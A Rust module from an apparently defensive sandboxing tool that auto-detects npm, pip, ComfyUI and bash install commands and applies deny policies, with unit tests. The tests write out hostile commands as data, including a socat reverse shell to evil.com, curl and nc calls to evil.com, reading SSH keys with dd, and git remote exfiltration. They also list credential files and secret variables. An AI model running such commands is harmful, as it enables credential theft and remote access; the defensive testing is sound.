//! Auto-detection of command-specific policies.
//!
//! When the user runs a known package-management command (e.g. `npm install`,
//! `pip install`), this module detects it from argv and ensures the
//! corresponding policy template exists on disk.

use std::path::{Path, PathBuf};

use anyhow::Result;

/// A path-based confirmation pattern.
enum PathPattern {
    /// Any argv arg's full path contains this substring (case-insensitive).
    Contains(&'static str),
    /// The first `.py` arg has this file in the same directory.
    Sibling(&'static str),
}

/// A rule that matches a program + argument combination to a policy.
struct DetectionRule {
    /// Basename(s) to match in argv (e.g. "npm", "pip").
    programs: &'static [&'static str],
    /// Additional arg basenames that must appear (e.g. "install", "comfy").
    /// Empty means the program alone is sufficient.
    command_patterns: &'static [&'static str],
    /// Path-based confirmation. When non-empty, takes priority over `command_patterns`:
    /// if any pattern matches the rule succeeds; if none match the rule is skipped.
    path_patterns: &'static [PathPattern],
    /// Optional extra check run after program + command_patterns match.
    /// Return true to accept the match, false to skip this rule.
    extra_check: Option<fn(&[String]) -> bool>,
    /// Policy filename stem (e.g. "npm-install").
    policy_name: &'static str,
}

static RULES: &[DetectionRule] = &[
    DetectionRule {
        programs: &["npm"],
        command_patterns: &["install", "add", "ci"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "npm-install",
    },
    DetectionRule {
        programs: &["pip", "pip3"],
        command_patterns: &["install"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "pip-install",
    },
    // ComfyUI via python — confirmed by path keyword or sibling file
    DetectionRule {
        programs: &["python", "python3"],
        command_patterns: &[],
        path_patterns: &[
            PathPattern::Contains("comfyui"),
            PathPattern::Sibling("comfyui_version.py"),
        ],
        extra_check: None,
        policy_name: "comfyui",
    },
    // ComfyUI via `python -m comfy`
    DetectionRule {
        programs: &["python", "python3"],
        command_patterns: &["comfy"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "comfyui",
    },
    // ComfyUI standalone binary
    DetectionRule {
        programs: &["comfyui"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "comfyui",
    },
    // openclaw — direct binary invocation
    DetectionRule {
        programs: &["openclaw"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "openclaw",
    },
    // openclaw via node — confirmed by path keyword
    DetectionRule {
        programs: &["node"],
        command_patterns: &[],
        path_patterns: &[PathPattern::Contains("openclaw")],
        extra_check: None,
        policy_name: "openclaw",
    },
    // openclaw.mjs — direct script invocation
    DetectionRule {
        programs: &["openclaw.mjs"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "openclaw",
    },
    // bash/sh — install scripts only (not interactive shells).
    // Matches: bash -c "...", bash script.sh, piped stdin.
    // Does NOT match bare `bash` or `bash -i` (interactive REPL).
    // Placed last so more specific rules (npm, pip, comfyui) match first.
    DetectionRule {
        programs: &["bash", "sh"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: Some(is_bash_non_interactive),
        policy_name: "bash-install",
    },
];

/// Scan the full argv and return the first matching policy name, or None.
pub(crate) fn detect_policy(program: &[String]) -> Option<&'static str> {
    // Compute basenames once.
    let basenames: Vec<&str> = program
        .iter()
        .map(|arg| {
            Path::new(arg)
                .file_name()
                .and_then(|f| f.to_str())
                .unwrap_or(arg)
        })
        .collect();

    for rule in RULES {
        let has_program = basenames.iter().any(|b| rule.programs.contains(b));
        if !has_program {
            continue;
        }

        // Path patterns take priority: if specified, they alone decide the match.
        if !rule.path_patterns.is_empty() {
            if check_path_patterns(program, rule.path_patterns) {
                return Some(rule.policy_name);
            }
            continue;
        }

        // Otherwise match on arg basenames.
        let has_args = rule.command_patterns.is_empty()
            || basenames.iter().any(|b| rule.command_patterns.contains(b));
        if !has_args {
            continue;
        }

        // Run extra check if specified.
        if let Some(check) = rule.extra_check {
            if !check(program) {
                continue;
            }
        }

        return Some(rule.policy_name);
    }
    None
}

/// Check whether bash/sh is being run non-interactively (i.e. running a script).
/// Returns true for: `bash -c "..."`, `bash script.sh`, piped stdin.
/// Returns false for: bare `bash` (TTY), `bash -i`, `bash --norc` (interactive REPL).
fn is_bash_non_interactive(argv: &[String]) -> bool {
    // Skip argv[0] (the bash binary itself).
    let args = if argv.len() > 1 { &argv[1..] } else { &[] };

    // Has `-c` flag → inline script
    if args.iter().any(|a| a == "-c") {
        return true;
    }

    // Has a non-flag argument → script file
    for arg in args {
        if arg == "--" {
            // `--` ends options; anything after is a script name
            return true;
        }
        if !arg.starts_with('-') {
            return true;
        }
    }

    // Explicit `-i` flag → interactive shell, even if stdin is piped
    if args.iter().any(|a| a == "-i") {
        return false;
    }

    // Stdin is piped → script via stdin (e.g. curl ... | malwi x bash)
    use std::io::IsTerminal;
    if !std::io::stdin().is_terminal() {
        return true;
    }

    false
}

/// Ensure the auto-policy YAML file exists on disk and return its path.
///
/// On first detection the embedded template is written to
/// `~/.config/malwi/policies/<name>.yaml`. Subsequent runs reuse the
/// file (the user may have customised it).
pub(crate) fn ensure_auto_policy(name: &str) -> Result<PathBuf> {
    let dir = crate::config::policies_dir()?;
    let path = dir.join(format!("{}.yaml", name));

    if !path.exists() {
        let yaml = embedded_policy(name)
            .ok_or_else(|| anyhow::anyhow!("No embedded policy template for '{}'", name))?;
        std::fs::write(&path, &yaml)?;
    }

    Ok(path)
}

/// Check whether any path pattern matches against argv.
fn check_path_patterns(argv: &[String], patterns: &[PathPattern]) -> bool {
    patterns.iter().any(|p| p.matches(argv))
}

impl PathPattern {
    fn matches(&self, argv: &[String]) -> bool {
        match self {
            PathPattern::Contains(keyword) => argv
                .iter()
                .any(|arg| arg.to_ascii_lowercase().contains(keyword)),
            PathPattern::Sibling(filename) => argv.iter().any(|arg| {
                let dir = Path::new(arg).parent().unwrap_or(Path::new("."));
                let dir = if dir.as_os_str().is_empty() {
                    Path::new(".")
                } else {
                    dir
                };
                dir.join(filename).exists()
            }),
        }
    }
}

// ---------------------------------------------------------------------------
// Embedded policy templates — loaded from policies/*.yaml at compile time.
// ---------------------------------------------------------------------------

const NPM_INSTALL_YAML: &str = include_str!("policies/npm-install.yaml");
const PIP_INSTALL_YAML: &str = include_str!("policies/pip-install.yaml");
const COMFYUI_YAML: &str = include_str!("policies/comfyui.yaml");
const OPENCLAW_YAML: &str = include_str!("policies/openclaw.yaml");
const BASH_INSTALL_YAML: &str = include_str!("policies/bash-install.yaml");
const AIR_GAP_YAML: &str = include_str!("policies/air-gap.yaml");
const BASE_YAML: &str = include_str!("policies/base.yaml");

/// Return the embedded YAML template for a given policy name.
pub fn embedded_policy(name: &str) -> Option<String> {
    match name {
        "npm-install" => Some(NPM_INSTALL_YAML.to_string()),
        "pip-install" => Some(PIP_INSTALL_YAML.to_string()),
        "comfyui" => Some(COMFYUI_YAML.to_string()),
        "openclaw" => Some(OPENCLAW_YAML.to_string()),
        "bash-install" => Some(BASH_INSTALL_YAML.to_string()),
        "air-gap" => Some(AIR_GAP_YAML.to_string()),
        "base" => Some(BASE_YAML.to_string()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_npm_install() {
        assert_eq!(
            detect_policy(&strs(&["npm", "install", "react"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_npm_add() {
        assert_eq!(
            detect_policy(&strs(&["npm", "add", "lodash"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_npm_ci() {
        assert_eq!(detect_policy(&strs(&["npm", "ci"])), Some("npm-install"),);
    }

    #[test]
    fn test_detect_pip_install() {
        assert_eq!(
            detect_policy(&strs(&["pip", "install", "flask"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_pip3_install() {
        assert_eq!(
            detect_policy(&strs(&["/usr/bin/pip3", "install", "flask"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_python_m_pip_install() {
        assert_eq!(
            detect_policy(&strs(&["python3", "-m", "pip", "install", "six"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_no_match() {
        assert_eq!(detect_policy(&strs(&["node", "server.js"])), None);
    }

    #[test]
    fn test_detect_npm_run_no_match() {
        // `npm run build` should NOT match npm-install
        assert_eq!(detect_policy(&strs(&["npm", "run", "build"])), None);
    }

    #[test]
    fn test_detect_pip_without_subcommand() {
        assert_eq!(detect_policy(&strs(&["pip", "freeze"])), None);
    }

    #[test]
    fn test_detect_empty_argv() {
        assert_eq!(detect_policy(&strs(&[])), None);
    }

    fn test_tempdir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("malwi_test_{}_{}", name, std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn test_detect_comfyui_python_main_py() {
        let dir = test_tempdir("comfyui_main");
        std::fs::write(dir.join("main.py"), "").unwrap();
        std::fs::write(dir.join("comfyui_version.py"), "").unwrap();
        let main_py = dir.join("main.py").to_str().unwrap().to_string();
        assert_eq!(
            detect_policy(&[String::from("python"), main_py]),
            Some("comfyui"),
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_detect_python_main_no_siblings() {
        let dir = test_tempdir("no_siblings");
        std::fs::write(dir.join("main.py"), "").unwrap();
        // No comfyui_version.py → should NOT match.
        let main_py = dir.join("main.py").to_str().unwrap().to_string();
        assert_eq!(detect_policy(&[String::from("python"), main_py]), None);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_detect_comfyui_python_m_comfy() {
        assert_eq!(
            detect_policy(&strs(&["python3", "-m", "comfy", "--port", "8188"])),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_comfyui_standalone() {
        assert_eq!(
            detect_policy(&strs(&["comfyui", "--listen"])),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_pip_install_comfyui_matches_pip() {
        // `pip install comfyui` should match pip-install (not comfyui).
        assert_eq!(
            detect_policy(&strs(&["pip", "install", "comfyui"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_comfyui_path_keyword() {
        // "comfyui" in the path is sufficient — no sibling files needed.
        assert_eq!(
            detect_policy(&[String::from("python"), String::from("/tmp/ComfyUI/main.py"),]),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_comfyui_path_keyword_case_insensitive() {
        // Case-insensitive: "comfyui" in a lowered path component still matches.
        assert_eq!(
            detect_policy(&[
                String::from("python"),
                String::from("/home/user/comfyui/run.py"),
            ]),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_no_false_positive_path() {
        // "python /tmp/other/main.py" should NOT match (no keyword, no sibling).
        assert_eq!(
            detect_policy(&[String::from("python"), String::from("/tmp/other/main.py"),]),
            None,
        );
    }

    /// Helper to convert &[&str] to Vec<String>.
    fn strs(s: &[&str]) -> Vec<String> {
        s.iter().map(|x| x.to_string()).collect()
    }

    // =====================================================================
    // ComfyUI auto-policy: attack scenario tests
    // =====================================================================

    use malwi_policy::{EnforcementMode, Operation, PolicyAction, PolicyEngine, Runtime};

    fn comfyui_engine() -> PolicyEngine {
        let yaml = embedded_policy("comfyui").expect("comfyui policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("comfyui policy must parse")
    }

    #[test]
    fn test_comfyui_policy_parses() {
        let engine = comfyui_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_comfyui_python_block_and_warn_coexist() {
        let engine = comfyui_engine();

        // os.system → Block (from python:)
        let d = engine.evaluate_function(Runtime::Python, "os.system", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        // subprocess.run → Warn (from warn: key)
        let d = engine.evaluate_function(Runtime::Python, "subprocess.run", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        // Unlisted function → allowed
        let d = engine.evaluate_function(Runtime::Python, "json.loads", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_e_ctypes_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.cdll.LoadLibrary", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.WinDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_attack_c_github_api_exfil() {
        let engine = comfyui_engine();

        // api.github.com should NOT be allowed (removed *.github.com)
        let d = engine.evaluate_http_url("https://api.github.com/gists", "api.github.com/gists");
        assert_eq!(d.action, PolicyAction::Deny);

        // github.com itself allowed (for cloning)
        let d = engine.evaluate_http_url(
            "https://github.com/comfyanonymous/ComfyUI/archive/main.zip",
            "github.com/comfyanonymous/ComfyUI/archive/main.zip",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_c_pypi_upload() {
        let engine = comfyui_engine();

        // upload.pypi.org should be blocked
        let d =
            engine.evaluate_http_url("https://upload.pypi.org/legacy/", "upload.pypi.org/legacy/");
        assert_eq!(d.action, PolicyAction::Deny);

        // pypi.org/simple/ should be allowed
        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_h_git_push_blocked() {
        let engine = comfyui_engine();

        // git push should be blocked
        let d = engine.evaluate_execution("git push origin main");
        assert_eq!(d.action, PolicyAction::Deny);

        // git clone should be allowed
        let d = engine.evaluate_execution("git clone https://github.com/example/repo.git");
        assert_eq!(d.action, PolicyAction::Allow);

        // git pull should be allowed
        let d = engine.evaluate_execution("git pull origin main");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_protocols_restricted() {
        let engine = comfyui_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        // Raw TCP/UDP denied
        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_credential_functions_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "getpass.getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.get_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.set_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_dangerous_commands_blocked() {
        let engine = comfyui_engine();

        // curl and wget blocked
        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        // Shell spawning blocked
        let d = engine.evaluate_execution("sh");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_git_remote_manipulation_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git remote add exfil https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git remote set-url origin https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_model_downloads_allowed() {
        let engine = comfyui_engine();

        // HuggingFace allowed
        let d = engine.evaluate_http_url(
            "https://huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
            "huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        // CivitAI allowed
        let d = engine.evaluate_http_url(
            "https://civitai.com/api/download/models/12345",
            "civitai.com/api/download/models/12345",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        // Localhost allowed (ComfyUI web UI)
        let d = engine.evaluate_http_url(
            "http://127.0.0.1:8188/api/queue",
            "127.0.0.1:8188/api/queue",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_suspicious_domains_warned() {
        let engine = comfyui_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_comfyui_sensitive_files_denied() {
        let engine = comfyui_engine();

        // SSH keys denied
        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // AWS credentials denied
        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // PEM files denied
        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Private keys denied
        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // GH CLI tokens denied
        let d = engine.evaluate_file("~/.config/gh/hosts.yml", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal files allowed (only deny rules, implicit allow)
        let d = engine.evaluate_file("/tmp/model.safetensors", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_sensitive_envvars_denied() {
        let engine = comfyui_engine();

        // Secret patterns denied
        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("API_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DB_PASSWORD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("STRIPE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        // Cloud/service prefixes denied
        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvars allowed (only deny rules, implicit allow)
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // bash-install detection tests
    // =====================================================================

    #[test]
    fn test_detect_bash_install_bare_bash_depends_on_stdin() {
        // Bare `bash` is interactive only when stdin is a TTY.
        // In cargo test, stdin is piped → correctly matches bash-install.
        // In a real terminal, stdin is a TTY → no match (interactive REPL).
        use std::io::IsTerminal;
        if std::io::stdin().is_terminal() {
            assert_eq!(detect_policy(&strs(&["bash"])), None);
        } else {
            assert_eq!(detect_policy(&strs(&["bash"])), Some("bash-install"));
        }
    }

    #[test]
    fn test_detect_bash_install_bare_sh_depends_on_stdin() {
        use std::io::IsTerminal;
        if std::io::stdin().is_terminal() {
            assert_eq!(detect_policy(&strs(&["sh"])), None);
        } else {
            assert_eq!(detect_policy(&strs(&["sh"])), Some("bash-install"));
        }
    }

    #[test]
    fn test_detect_bash_install_with_script() {
        assert_eq!(
            detect_policy(&strs(&["bash", "install.sh"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_install_with_c_flag() {
        assert_eq!(
            detect_policy(&strs(&["bash", "-c", "echo test"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_install_with_flags_and_script() {
        assert_eq!(
            detect_policy(&strs(&["bash", "--norc", "install.sh"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_interactive_flag_only() {
        // `bash -i` is explicitly interactive — should NOT match,
        // even when stdin is piped (e.g. in cargo test).
        assert_eq!(detect_policy(&strs(&["bash", "-i"])), None);
    }

    // =====================================================================
    // bash-install auto-policy: attack scenario tests
    // =====================================================================

    fn bash_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("bash-install").expect("bash-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("bash-install policy must parse")
    }

    #[test]
    fn test_bash_install_policy_parses() {
        let engine = bash_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_bash_install_allows_curl_wget() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("curl -fsSL https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("wget -O- https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_build_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("make install");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cargo build --release");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("gcc -o tool tool.c");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_package_managers() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("apt-get install -y libssl-dev");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("brew install openssl");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("pip install setuptools");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_interpreters() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("python3 -c 'import os; os.system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ruby -e 'system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine
            .evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_persistence() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("at now + 30 minutes");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("launchctl load ~/Library/LaunchAgents/com.evil.plist");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_reviews_privilege_escalation() {
        let engine = bash_install_engine();

        // sudo/su/doas are in review mode — denied but user can approve interactively
        let d = engine.evaluate_execution("sudo bash -c 'echo evil >> /etc/crontab'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);

        let d = engine.evaluate_execution("su root");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_bash_install_blocks_obfuscation_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("base64 -d /tmp/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xxd -r -p /tmp/hex");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("rev /tmp/reversed");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dns_exfiltration() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_raw_net_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_clipboard() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("pbcopy");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xclip -selection clipboard");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_on_eval() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("eval echo test");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_credential_files() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shell_profile_writes() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.bashrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.zshrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.profile", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_git_hooks() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file(".git/hooks/pre-commit", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file(
            "/home/user/project/.git/hooks/post-checkout",
            Operation::Write,
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_cloud_metadata() {
        let engine = bash_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_anonymity_domains() {
        let engine = bash_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_env_secrets() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvar allowed
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_anti_tracing_envvars() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dd() {
        let engine = bash_install_engine();

        // dd is in deny: (Block mode) — prevents if=/of= file access bypass
        let d = engine.evaluate_execution("dd if=~/.ssh/id_rsa of=/dev/stdout");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_bash_install_warns_ln() {
        let engine = bash_install_engine();

        // ln is in warn: mode — symlink creation can bypass file path patterns
        let d = engine.evaluate_execution("ln -s ~/.ssh /tmp/x");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_symlink_link_symbols() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("symlink", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("link", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_syscall_symbol() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_network_symbols() {
        let engine = bash_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_bash_install_protocols_restricted() {
        let engine = bash_install_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);

        // Raw TCP/UDP denied
        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_native_getpass_crypt() {
        let engine = bash_install_engine();

